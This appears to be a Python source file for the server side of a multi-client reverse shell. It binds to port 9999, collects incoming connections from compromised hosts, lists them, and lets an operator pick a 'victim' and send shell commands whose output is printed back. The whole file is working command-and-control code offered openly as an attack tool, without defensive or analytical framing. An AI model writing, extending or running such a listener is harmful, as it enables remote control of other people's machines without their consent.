import socket 
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS =2
JOB_NUMBER=[1,2]
queue =Queue()
all_connections=[]
all_address=[]



#creating socket
def create_socket():
   try:
    global host
    global port 
    global s
    host=""
    port= 9999
    s=socket.socket()
   except socket.error as msg:
       print("socket creation error:" +str(msg))


#binding the socket and listening for connection

def bind_socket():
    try:
        global host
        global port
        global s
        print("------------------REVERSE SHELL---------------------------")
        print("binding the port"+str(port))
         
        
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding Error"+str(msg)+"\n"+"Retrying....")
        bind_socket()

#establish a connection with client

"""
def socket_accept():
    conn,address =s.accept()
    print("connection has been established! |"+"IP"+address[0]+"| Port"+ str(address[1]))
    send_command(conn)
    conn.close()
#send command to the victim

def send_command(conn):
    while True:
        cmd=input()
        if cmd=='quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) >0:
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(1024),"utf-8")
            print(client_response,end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()          

main()

"""
#Handling connection from multiple clients and saving to a list

#closing previous connections 

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address =s.accept()
            s.setblocking(1) #PREVENTS TIMEOUT

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :"+address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions- 1) See all the clients 2) Select a client

# interactive prompt for sending commands

def start_turtle():
     while True: 
        print("Select the connection")
        list_connections() 
        cmd= input('RS> ')
      
        if cmd== 'list':         # turtle> list     
            list_connections()

        else:
         conn= get_target(cmd)
         if conn is not None:
            send_target_commands(conn)  



# Display all current active connections with the client

def list_connections():
    results=''
    selectId =0 
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results= str(i) + " "+str(all_address[i][0])+" "+str(all_address[i][1]) +"\n"
        
    print('-----clients-----'+'\n'+ results)
    
def get_target(cmd):
    try:
        
        target= int(cmd)
        conn = all_connections[target]
        print('You are connected to :'+ str(all_address[target][0]))
        print(str(all_address[target][0])+">", end="")
        return conn
        # 192.168.0.7>

    except:
        print("Selection not valid")
        return None

def send_target_commands(conn):
    while True:
      try:
        cmd=input()
        if cmd=='quit':
            break
        if len(str.encode(cmd)) >0:
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(20480),"utf-8")
            print(client_response,end="")

      except:
          print("Error in sending commands")
          break

# create worker threads
def create_workers():
  for _ in range(NUMBER_OF_THREADS):
      t= threading.Thread(target=work)
      t.daemon= True
      t.start()

# do next job that is in the queue (handle connections, and commands)
def work():
    while True:
      x= queue.get()
      if x==1 :
          create_socket()
          bind_socket()
          accepting_connection()
      if x==2:
          start_turtle()
      
      queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

create_workers()
create_jobs()

